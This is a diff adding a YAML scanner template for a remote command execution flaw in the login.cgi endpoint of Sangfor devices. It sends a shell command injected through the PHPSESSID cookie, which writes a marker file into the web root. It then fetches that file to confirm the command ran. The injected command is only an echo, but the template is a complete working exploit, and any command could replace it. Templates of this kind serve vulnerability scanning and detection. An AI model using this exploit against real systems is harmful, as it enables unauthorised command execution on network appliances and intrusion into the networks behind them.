@@ -1,0 +1,40 @@
+id: sangfor_login_rce
+
+info:
+  name: sangfor_login_rce
+  author: HB
+  severity: critical
+
+
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /cgi-bin/login.cgi HTTP/1.1
+    User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+    Host: {{Hostname}}
+    Content-Type: Application/X-www-Form
+    Cookie: PHPSESSID=`$(echo 7258052001 > /fwlib/sys/virus/webui/svpn_html/502082888.txt)`;
+    Content-Length: 111
+
+    {"opr":"login", "data":{"user": "watchTowr" , "pwd": "watchTowr" , "vericode": "EINW" , "privacy_enable": "0"}}
+
+  - |-
+    GET /svpn_html/502082888.txt HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Connection: close
+
+  matchers:
+    - type: dsl
+      dsl:
+        - 'contains_all(body_2,'7258052001')'
+
+# Generated From WebFuzzer on 2024-04-19 00:55:10
